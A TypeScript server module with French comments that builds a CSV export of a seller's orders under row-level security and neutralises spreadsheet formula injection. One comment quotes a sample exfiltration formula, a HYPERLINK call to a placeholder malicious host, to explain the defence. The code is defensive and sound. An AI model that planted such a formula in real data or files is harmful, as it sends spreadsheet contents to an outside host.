import "server-only";
import { lienPageClient } from "@/lib/liens/page-client";
import { lireCommandes, ParametresListe, type ClientLecture } from "./liste";

/**
 * L'EXPORT CSV DES COMMANDES.
 *
 * DÉVIATION DOCUMENTÉE AU BRIEF : c'est un route handler et non une Server
 * Action, parce qu'un téléchargement exige `Content-Disposition`, en-tête qu'une
 * Server Action ne peut pas fixer. Et un export est une LECTURE.
 *
 * LECTURE SOUS RLS AVEC LA SESSION, JAMAIS SERVICE-ROLE. Un export est le pire
 * endroit où contourner l'isolation : il produit un fichier qui SORT de
 * l'application, qui sera ouvert ailleurs, transmis, gardé. Une fuite ici ne se
 * rattrape pas.
 *
 * `internal_notes` EST ABSENTE, et ce n'est pas un oubli à combler. Elle porte
 * le prix d'achat. Le vendeur ne décide pas d'une fuite, il décide d'un export —
 * deux gestes différents, parfois séparés de plusieurs mois. La colonne n'est
 * d'ailleurs même pas lue par `lireCommandes` : elle ne peut donc pas arriver
 * ici par distraction.
 *
 * LES LIENS PUBLICS Y SONT, avec avertissement au téléchargement. C'est ce que
 * le vendeur vient chercher — retrouver le lien d'une commande sans rouvrir
 * l'écran — et le lui refuser rendrait l'export inutile. Mais un jeton public
 * transfère une CAPACITÉ, définitivement : le fichier vaut donc autant que les
 * pages qu'il ouvre.
 */

/** Ce que l'export contient, dans l'ordre des colonnes. */
const ENTETES = [
  "client",
  "reference",
  "numero_suivi",
  "statut_expedition",
  "statut_qc",
  "creee_le",
  "modifiee_le",
  "archivee_le",
  "vues",
  "derniere_vue_le",
  "lien_public",
] as const;

/**
 * Borne dure du nombre de lignes exportées.
 *
 * Un vendeur à neuf mille commandes en produirait un fichier de plusieurs
 * mégaoctets, assemblé en mémoire dans une fonction sans serveur. La borne est
 * DITE dans le fichier lui-même : un export tronqué en silence est un export
 * dont on croira qu'il est complet, et c'est bien pire qu'un export refusé.
 */
const PLAFOND_LIGNES = 5000;

/**
 * Neutralise une valeur qui serait interprétée comme une FORMULE.
 *
 * `customer_label` et `product_ref` sont du TEXTE LIBRE saisi par le vendeur, et
 * `customer_label` porte souvent un pseudo venu d'une conversation. Excel,
 * LibreOffice et Google Sheets évaluent toute cellule commençant par `=`, `+`,
 * `-`, `@`, ou par une tabulation — donc `=HYPERLINK("http://mal.tld?"&A1)`
 * dans un nom de client devient un lien cliquable qui exfiltre la ligne, à
 * l'ouverture du fichier, sur la machine de quelqu'un d'autre.
 *
 * L'échappement CSV standard NE PROTÈGE PAS DE CELA : les guillemets rendent la
 * cellule bien formée, et la formule s'évalue quand même. C'est pour cette
 * raison qu'on ne peut pas se contenter de « bien former le CSV ».
 *
 * On préfixe d'une apostrophe, qui est la convention des tableurs pour « ceci
 * est du texte ». Elle est visible dans la cellule ; c'est le prix, et il est
 * payé sur les seules valeurs concernées.
 */
function neutraliserFormule(valeur: string): string {
  return /^[=+\-@\t\r]/.test(valeur) ? "'" + valeur : valeur;
}

/**
 * Échappe une cellule au format CSV, séparateur virgule.
 *
 * ⚠️ EXPORTÉE POUR L'EXPORT DES ENVOIS, ET SURTOUT PAS RECOPIÉE LÀ-BAS. Elle
 * porte la neutralisation des formules ci-dessus, qui est une protection, pas
 * une commodité : une seconde copie aurait divergé au premier ajustement, et
 * c'est le genre de divergence qu'on ne découvre qu'en ouvrant un fichier chez
 * quelqu'un d'autre.
 */
export function celluleCsv(valeur: string | number | null): string {
  return cellule(valeur);
}

function cellule(valeur: string | number | null): string {
  if (valeur === null) return "";
  const texte = neutraliserFormule(String(valeur));
  // Les guillemets se doublent ; on encadre dès qu'un caractère structurant
  // apparaît. Encadrer TOUT serait plus simple mais rendrait le fichier deux
  // fois plus lourd sans rien apporter.
  return /[",\n\r]/.test(texte) ? '"' + texte.replaceAll('"', '""') + '"' : texte;
}

export interface ResultatExport {
  readonly csv: string;
  readonly lignes: number;
  /** Vrai si le plafond a coupé l'export. Dit dans le fichier, jamais tu. */
  readonly tronque: boolean;
}

export async function exporterCommandes(
  parametres: ParametresListe,
  origine: string,
  /**
   * Le nom de lien de la boutique, `null` si aucun n'a ete pose.
   *
   * ⚠️ IL COMPTE PLUS ICI QU'AILLEURS. Un export CSV SORT du produit : ses
   * lignes finissent dans un tableur, puis dans des messages envoyes aux
   * clients. Une adresse `/p/<jeton>` exportee par un vendeur qui a pose son
   * nom ne serait pas fausse — elle repond — mais elle annulerait, commande
   * par commande, ce pour quoi il a paye.
   */
  nomDeLien: string | null,
  client?: ClientLecture,
): Promise<ResultatExport> {
  const lignes: string[] = [ENTETES.join(",")];
  let curseur: string | null = parametres.curseur;
  let total = 0;
  let tronque = false;

  // PAGINATION PAR CURSEUR, la même que l'écran. Un `offset` ferait croître le
  // coût avec le numéro de page : à la page quarante d'un jeu de neuf mille, il
  // lirait deux mille lignes pour en rendre cinquante.
  for (;;) {
    const page = await lireCommandes({ ...parametres, curseur }, client);

    for (const l of page.lignes) {
      if (total >= PLAFOND_LIGNES) {
        tronque = true;
        break;
      }
      lignes.push(
        [
          cellule(l.client),
          cellule(l.reference),
          cellule(l.numeroSuivi),
          cellule(l.statut),
          cellule(l.qc),
          cellule(l.creeeLe),
          cellule(l.modifieeLe),
          cellule(l.archiveeLe),
          cellule(l.vues),
          cellule(l.derniereVueLe),
          cellule(lienPageClient(origine, l.jetonPublic, nomDeLien)),
        ].join(","),
      );
      total += 1;
    }

    if (tronque || page.suivant === null) break;
    curseur = page.suivant;
  }

  if (tronque) {
    // DIT DANS LE FICHIER, parce que c'est le fichier qu'on relira dans six
    // mois, pas l'écran qui l'a produit. Une ligne de commentaire plutôt qu'une
    // ligne de données : elle ne peut pas être prise pour une commande.
    lignes.push("");
    lignes.push(
      cellule(
        "Export limité à " +
          String(PLAFOND_LIGNES) +
          " lignes. Affinez les filtres pour obtenir le reste.",
      ),
    );
  }

  // BOM UTF-8 : sans lui, Excel sous Windows lit le fichier en ANSI et « Crème »
  // devient « CrÃ¨me ». Le vendeur conclurait que l'export corrompt ses données.
  return { csv: "﻿" + lignes.join("\r\n") + "\r\n", lignes: total, tronque };
}

export { ParametresListe };
